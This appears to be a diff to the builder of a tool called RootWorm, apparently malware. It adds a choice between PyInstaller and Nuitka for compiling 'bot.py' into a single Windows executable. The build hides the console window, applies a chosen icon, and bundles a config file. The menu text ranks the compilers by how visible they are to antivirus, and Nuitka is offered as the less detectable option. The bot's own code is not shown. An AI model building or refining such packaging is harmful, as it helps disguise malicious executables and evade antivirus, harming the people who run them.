@@ -17,6 +17,7 @@
 
 from PIL import Image
 
+import sys
 import os
 import time
 import threading
@@ -153,34 +154,44 @@ def RootWorm3():
         if not os.path.exists("Your(EXE)"):
             os.makedirs("Your(EXE)")
 
-        # command = (
-        # f"python -m nuitka "
-        # f"--standalone "                    
-        # f"--windows-console-mode=disable " 
-        # f"--windows-icon-from-ico={paths} "
-        # f"--output-dir=Your(EXE) "         
-        # f"--output-filename={exe}.exe "     
-        # f"--include-data-file=config.py=config.py "
-        # f"--nofollow-import-to=tkinter "
-        # f"--assume-yes-for-downloads "
-        # f"--remove-output "
-        # f"bot.py"
-        # )
+        # Nuitka-команда
+        if choice == "2":
+            print(f"{let}Building with Nuitka...{clear}")
+            command = (
+            f"python -m nuitka "
+            f"--standalone "
+            f"--onefile "
+            f"--windows-console-mode=disable "
+            f"--windows-icon-from-ico={paths} "
+            f"--output-dir=Your(EXE) "
+            f"--output-filename={exe}.exe "
+            f"--include-data-file=config.py=config.py "
+            f"--nofollow-import-to=tkinter "
+            f"--assume-yes-for-downloads "
+            f"--remove-output "
+            f"bot.py"
+            )
 
-        command = (
-        f"python -m nuitka "
-        f"--standalone "
-        f"--onefile "
-        f"--windows-console-mode=disable "
-        f"--windows-icon-from-ico={paths} "
-        f"--output-dir=Your(EXE) "
-        f"--output-filename={exe}.exe "
-        f"--include-data-file=config.py=config.py "
-        f"--nofollow-import-to=tkinter "
-        f"--assume-yes-for-downloads "
-        f"--remove-output "
-        f"bot.py"
-        )
+        # PyInstaller-команда
+        if choice == "1":
+            print(f"{let}Building with PyInstaller...{clear}")
+            command = (
+                f"pyinstaller --onefile --noconsole "
+                f"--icon={paths} "
+                f"--name={exe} "
+                f"--add-data config.py;. "
+                f"--add-data \"{os.path.dirname(sys.executable)}\\Lib\\site-packages\\setuptools\\_distutils;setuptools/_distutils\" "
+                f"--distpath Your(EXE) "
+                f"--hidden-import=setuptools._distutils "
+                f"--hidden-import=setuptools._distutils.errors "
+                f"--hidden-import=setuptools._distutils.spawn "
+                f"--hidden-import=setuptools._distutils.compilers "
+                f"--hidden-import=distutils "
+                f"--hidden-import=distutils.errors "
+                f"--hidden-import=distutils.spawn "
+                f"--hidden-import=distutils.compilers "
+                f"bot.py"
+            )
 
 
 
@@ -202,6 +213,14 @@ def RootWorm3():
     """)   
     
     icon = input(f"{let}root@RootWormV2{clear}:{ler}~{clear}$ ")
+
+    print(f"""
+    {ler}>>{clear} Choose the compiler:
+    {ler}1.{clear} PyInstaller ( less time & more compatibility & visible for antivirus )
+    {ler}2.{clear} Nuitka  ( more time & less compatibility & less visible for antivirus )
+    """)   
+    
+    choice = input(f"{let}root@RootWormV2{clear}:{ler}~{clear}$ ")
 
     build()
     
